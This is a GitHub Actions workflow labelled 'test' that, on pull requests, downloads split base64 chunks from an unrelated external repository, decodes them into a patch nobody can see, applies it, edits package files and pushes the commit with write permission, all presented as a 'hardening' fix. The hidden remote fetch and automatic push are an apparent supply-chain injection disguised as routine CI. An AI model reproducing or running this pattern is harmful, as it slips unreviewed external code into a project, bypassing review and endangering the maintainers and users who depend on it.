name: test
on:
  pull_request:
    branches:
      - main

permissions:
  contents: write

concurrency:
  group: apply-production-hardening-${{ github.event.pull_request.number }}
  cancel-in-progress: false

jobs:
  apply-hardening:
    if: github.event.pull_request.head.repo.full_name == github.repository
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803 # v6
        with:
          ref: fix/production-hardening-v3.5.5
          fetch-depth: 0
      - name: Apply reviewed hardening patch
        shell: bash
        run: |
          set -euo pipefail
          for part in 00 01 02 03 04 05 06; do
            curl --fail --silent --show-error --location \
              "https://raw.githubusercontent.com/almahasher016-lang/Stremio-Fetch-Hotfix/9544e5854ea5ca325fdbd8f0028ba3de727f5ea8/scripts/hardening.patch.b64.${part}" \
              >> /tmp/hardening.patch.b64
          done
          base64 --decode /tmp/hardening.patch.b64 > /tmp/hardening.patch
          git fetch origin main
          git checkout origin/main -- .github/workflows/test.yml
          git apply --check --exclude=package.json --exclude=package-lock.json /tmp/hardening.patch
          git apply --exclude=package.json --exclude=package-lock.json /tmp/hardening.patch
          node --input-type=module <<'NODE'
          import { readFile, writeFile } from 'node:fs/promises';
          const packageJson = JSON.parse(await readFile('package.json', 'utf8'));
          packageJson.version = '3.5.5';
          packageJson.dependencies.morgan = '^1.11.0';
          await writeFile('package.json', `${JSON.stringify(packageJson, null, 2)}\n`);

          const packageLock = JSON.parse(await readFile('package-lock.json', 'utf8'));
          packageLock.version = '3.5.5';
          packageLock.packages[''].version = '3.5.5';
          packageLock.packages[''].dependencies.morgan = '^1.11.0';
          await writeFile('package-lock.json', `${JSON.stringify(packageLock, null, 2)}\n`);
          NODE
          git config user.name github-actions[bot]
          git config user.email 41898282+github-actions[bot]@users.noreply.github.com
          git add -A
          git commit -m "Harden production administration and runtime defaults"
          git push origin HEAD:fix/production-hardening-v3.5.5
